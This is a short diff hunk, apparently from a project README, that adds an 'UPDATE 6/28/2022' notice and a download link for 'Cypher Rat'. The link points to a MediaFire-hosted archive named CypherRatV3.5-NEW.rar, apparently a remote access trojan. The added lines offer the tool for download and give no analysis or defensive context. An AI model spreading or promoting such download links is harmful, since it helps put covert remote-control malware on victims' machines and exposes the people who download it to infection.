@@ -157,7 +157,9 @@ Images :
 
 --------------
 
+**UPDATE 6/28/2022** NEW
 
+[DOWNLOAD Cypher Rat](https://www.mediafire.com/file/blw2rs4qqlkn56d/CypherRatV3.5-NEW.rar/file)
 
 --------------
 
